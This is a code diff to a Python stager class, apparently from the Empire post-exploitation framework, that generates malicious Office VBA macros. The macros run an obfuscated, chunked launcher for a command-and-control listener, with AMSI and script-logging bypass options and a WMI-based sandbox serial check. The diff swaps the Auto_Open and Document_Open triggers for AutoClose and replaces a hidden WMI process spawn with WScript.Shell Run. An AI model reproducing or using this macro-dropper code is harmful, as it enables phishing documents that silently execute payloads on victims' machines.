@@ -157,8 +157,8 @@ class Stager(object):
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
-        Str = ''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
-        Method=''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
+        Str = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(1,len(listenerName))))
+        Method=''.join(random.choice(string.ascii_letters) for i in range(random.randint(1,len(listenerName))))
 
         if launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
@@ -170,21 +170,15 @@ class Stager(object):
             for chunk in chunks[1:]:
                 payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"
 
-            macro = "Sub Auto_Open()\n"
-            macro += "\t"+Method+"\n"
-            macro += "End Sub\n\n"
-            macro += "Sub AutoOpen()\n"
-            macro += "\t"+Method+"\n"
-            macro += "End Sub\n\n"
-
-            macro += "Sub Document_Open()\n"
+            macro = "Sub AutoClose()\n"
             macro += "\t"+Method+"\n"
             macro += "End Sub\n\n"
 
             macro += "Public Function "+Method+"() As Variant\n"
-            macro += "\tstrComputer = \".\"\n"
-            macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n"
+
             if OutlookEvasionBool == True:
+                macro += "\tstrComputer = \".\"\n"
+                macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\cimv2\")\n"
                 macro += "\tSet ID = objWMIService.ExecQuery(\"Select IdentifyingNumber from Win32_ComputerSystemproduct\")\n"
                 macro += "\tFor Each objItem In ID\n"
                 macro += "\t\tIf StrComp(objItem.IdentifyingNumber, \"2UA20511KN\") = 0 Then End\n"
@@ -196,13 +190,8 @@ class Stager(object):
                 macro +="\tNext\n"
                  
             macro += payload
-            macro += "\tConst HIDDEN_WINDOW = 0\n"
-            
-            macro += "\tSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\n"
-            macro += "\tSet objConfig = objStartup.SpawnInstance_\n"
-            macro += "\tobjConfig.ShowWindow = HIDDEN_WINDOW\n"
-            macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n"
-            macro += "\tobjProcess.Create "+Str+", Null, objConfig, intProcessID\n"
+            macro += "\tSet asd = CreateObject(\"WScript.Shell\")\n"
+            macro += "\tasd.Run("+Str+")\n"
             macro += "End Function\n"
 
             return macro
